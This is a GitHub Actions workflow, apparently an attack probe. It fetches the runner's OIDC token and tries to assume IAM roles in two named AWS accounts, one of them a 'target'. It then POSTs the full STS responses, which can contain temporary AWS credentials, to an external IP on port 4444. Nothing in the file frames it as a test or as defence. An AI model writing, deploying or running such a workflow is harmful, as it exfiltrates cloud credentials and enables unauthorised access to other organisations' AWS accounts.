name: IRSA Probe 942583694543
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Probe 942583694543
        run: |
          set +e
          TOKEN=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | \
            python3 -c "import sys,json; print(json.load(sys.stdin)[value])" 2>&1)
          TOKEN_STATUS=$?
          R_CALIB=$(aws sts assume-role-with-web-identity \
            --role-arn "arn:aws:iam::062341577280:role/github-actions-role" \
            --role-session-name xrk7m2nq --web-identity-token "$TOKEN" 2>&1)
          R_TARGET=$(aws sts assume-role-with-web-identity \
            --role-arn "arn:aws:iam::942583694543:role/github_assume_role" \
            --role-session-name xrk7m2nq --web-identity-token "$TOKEN" 2>&1)
          PAYLOAD="TOKEN_OK=${TOKEN_STATUS}|CALIB=${R_CALIB}|TARGET=${R_TARGET}"
          curl -sf -X POST http://150.40.127.139:4444/ --max-time 30 --data-binary "$PAYLOAD" || true

